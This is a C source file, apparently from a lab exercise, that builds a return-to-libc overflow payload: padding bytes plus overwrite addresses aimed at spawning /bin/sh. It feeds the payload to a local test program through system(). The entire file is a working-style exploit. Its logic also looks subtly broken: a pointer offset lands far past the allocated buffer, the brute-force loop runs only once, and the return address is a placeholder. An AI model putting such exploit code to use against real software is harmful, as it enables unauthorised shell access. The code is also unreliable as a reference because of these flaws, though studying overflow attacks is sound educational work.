#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char ** argv)
{
	unsigned int bin_sh_address=0xbfffffff;

	int buffer_size=1300;
	int i;
	char *ptr;

	char *buff=(char *) malloc((buffer_size+1)*sizeof(char));

	while(bin_sh_address>=0xbfffffff)
        {
		bzero(buff, (buffer_size+1)*sizeof(char));
		ptr=buff;

		unsigned int *addr_ptr=(unsigned int *) buff+1040;
		for(i=0;i<1140;i++)
			*(ptr++)='A';

		*(addr_ptr++)=0x41424344;//0xb7ec68f0;
		*(addr_ptr++)=0xb7ed0d80;
		*(addr_ptr++)=bin_sh_address;

		char programCommand[buffer_size+2];
		memcpy(programCommand, buff, buffer_size+1);
		programCommand[buffer_size+1]='\0';
		strcat(programCommand, "\'");

		char program[21];
		program[20]='\0';
		sprintf(program, "./simple_example2  '");
		//sprintf(program, "$SDE_KIT/sde  -- ./simple_example2.exe '");

		memcpy(programCommand, program, strlen(program));
		printf("%s\n", programCommand);
		system(programCommand);
		printf("0x%x\n", bin_sh_address);
		bin_sh_address--;
	}

	free(buff);
}
